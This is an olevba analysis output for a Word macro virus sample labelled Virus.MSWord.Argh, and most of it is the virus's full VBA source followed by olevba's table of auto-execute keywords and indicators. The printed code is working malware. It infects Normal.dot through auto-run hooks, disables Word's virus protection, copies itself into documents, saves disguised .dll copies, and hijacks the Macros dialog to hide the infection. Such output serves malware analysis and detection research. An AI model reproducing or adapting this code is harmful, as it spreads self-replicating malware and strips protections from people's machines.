olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Argh-b75d914777b3970004b7373588d60e89a534a9dd
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Argh-b75d914777b3970004b7373588d60e89a534a9dd - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros.bas 
in file: Virus.MSWord.Argh-b75d914777b3970004b7373588d60e89a534a9dd - OLE stream: 'Macros/VBA/NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub infect(m)
Application.DisplayAlerts = wdAlertsNone
d = Assistant.Animation
Assistant.Animation = msoAnimationGetTechy
getnormal (1)
Assistant.Animation = d
End Sub

Sub deletenormal(m)
On Error GoTo e
    Application.OrganizerRename Source:= _
        NormalTemplate.FullName, Name:= _
        "NewMacros", NewName:="oldNewMacros", Object:= _
        wdOrganizerObjectProjectItems
e:
End Sub
Sub copymacro(m)
On Error GoTo eco
    Application.OrganizerCopy Source:= _
        ActiveDocument.FullName, Destination:= _
        NormalTemplate.FullName, Name:= _
        "NewMacros", Object:=wdOrganizerObjectProjectItems
eco:
End Sub

Sub replicate(m)
If Int((50 * Rnd) + 1) = 25 Then
   Set a = Assistant.NewBalloon
   a.Heading = "Help me"
   a.Text = "I'm not feeling very vell .. AAARGHH!!!"
   a.Show
   End If
On Error GoTo re
    With ActiveDocument
        .AttachedTemplate = "Normal.dot"
    End With
    Application.OrganizerCopy Source:= _
        NormalTemplate.FullName, Destination:= _
        ActiveDocument.FullName, Name:="NewMacros", _
        Object:=wdOrganizerObjectProjectItems
re:
End Sub
Sub AutoNew()
infect (1)
replicate (1)
runmacro ("AutoNew")
End Sub
Sub AutoClose()
infect (1)
replicate (1)
runmacro ("AutoClose")
End Sub
Sub AutoOpen()
infect (1)
replicate (1)
runmacro ("autoopen")
End Sub
Sub AutoExit()
infect (1)
replicate (1)
runmacro ("AutoExit")
End Sub
Sub ToolsMacro()
If Documents.Count = 0 Then
n = MsgBox("Microsoft is protecting your normal.dot from virus infection You can only add macros to other documents", vbOKOnly)
Exit Sub
Else
getnormal (1)
restoreoriginal (1)
Dialogs(wdDialogToolsMacro).Show
recopy (1)
End If
End Sub

Sub restoreoriginal(m)
On Error GoTo rr1:
    Application.OrganizerDelete Source:= _
        NormalTemplate.FullName, Name:= _
        "NewMacros", Object:=wdOrganizerObjectProjectItems
rr1:
 On Error GoTo rro:
    Application.OrganizerRename Source:= _
        NormalTemplate.FullName, Name:= _
        "oldNewMacros", NewName:="NewMacros", Object:= _
        wdOrganizerObjectProjectItems
rro:
End Sub
Sub recopy(m)
On Error GoTo eco
    reren (1)
    Application.OrganizerCopy Source:= _
        Options.DefaultFilePath(wdProgramPath) + Application.PathSeparator + "wininf.dll", Destination:= _
        NormalTemplate.FullName, Name:= _
        "NewMacros", Object:=wdOrganizerObjectProjectItems
eco:
End Sub
Sub reren(m)
On Error GoTo rre
Application.OrganizerRename Source:= _
        NormalTemplate.FullName, Name:= _
        "NewMacros", NewName:="oldNewMacros", Object:= _
        wdOrganizerObjectProjectItems
rre:
End Sub
Sub getnormal(m)
virusflag = System.PrivateProfileString("prncfg.ini", "Printer Port", "PortNumber")
Options.VirusProtection = False
If virusflag = "" Then
   System.PrivateProfileString("prncfg.ini", "Printer Port", "PortNumber") = "340"
   NormalTemplate.OpenAsDocument                                  'save normal.dot to windot.dll
   ActiveDocument.SaveAs FileName:=Options.DefaultFilePath(wdProgramPath) + Application.PathSeparator + "windot.dll"
   ActiveDocument.Close
   deletenormal (1)
   copymacro (1)
   NormalTemplate.OpenAsDocument
   ActiveDocument.SaveAs FileName:=Options.DefaultFilePath(wdProgramPath) + Application.PathSeparator + "wininf.dll" 'save infected dot
   ActiveDocument.Close
End If
End Sub
Sub runmacro(m)
On Error GoTo rme
Application.Run "Normal.oldNewMacros." + m
rme:
End Sub
Sub stealth()
ToolsMacro
MsgBox "stealth"
End
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |wininf.dll          |Executable file name                         |
|IOC       |windot.dll          |Executable file name                         |
+----------+--------------------+---------------------------------------------+

